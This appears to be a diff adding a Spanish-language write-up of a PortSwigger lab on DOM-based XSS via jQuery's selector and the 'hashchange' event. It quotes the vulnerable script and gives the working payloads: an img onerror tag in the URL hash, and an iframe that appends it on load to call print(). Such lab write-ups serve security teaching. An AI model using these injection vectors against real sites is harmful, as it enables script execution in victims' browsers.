@@ -87,10 +87,32 @@ https://0a1b00b10484e04b806180af00a40014.web-security-academy.net/feedback?retur
 ```
 
 ## Reto 6: XSS DOM con jQuery y evento ‘hashchange’
+Este laboratorio contiene una vulnerabilidad de scripts entre sitios basada en DOM en la página de inicio. Utiliza jQuery. $ Función de selección para desplazarse automáticamente a una publicación determinada, cuyo título se pasa a través de la location.hash .
 
+Para resolver el laboratorio, entregue un exploit a la víctima que llame al print() en su navegador. 
+
+Este script permite que, al cambiar el hash en la URL (ej. #MiTitulo), la página busque un encabezado <h2> con ese texto dentro de la lista del blog y haga scroll hacia él automáticamente.
+
+El problema es que se emplea directamente como selector, sin validación alguna, permitiendo al atacante manipularlo para inyectar y ejecutar código en el navegador de la víctima.
+
+```html
 <script>
     $(window).on('hashchange', function(){
         var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
             if (post) post.get(0).scrollIntoView();
             });
 </script>
+```
+
+Montamos un ataque usando un servidor de explotación que carga la página vulnerable dentro de un contenedor invisible. Al modificarse dinámicamente la URL interna, se inyecta una instrucción que se ejecuta automáticamente mediante un evento de error, invocando una función del navegador como demostración.
+
+En la URL ponemos la siguiente sentencia, esta como no existe una imagen que sea 0 da el error y se va a la funcion print(), sin embargo esto si lo pasamos no funcionará:
+
+```
+/#<img src=0 onerror=print()>
+```
+
+Podemos usar `<iframe>` para meter una página web dentro de otra y concatenar la funcion print()
+```
+<iframe src="https://url.burp/#" onload="this.src +='<img src=0 onerror=print()>'"><iframe>
+```
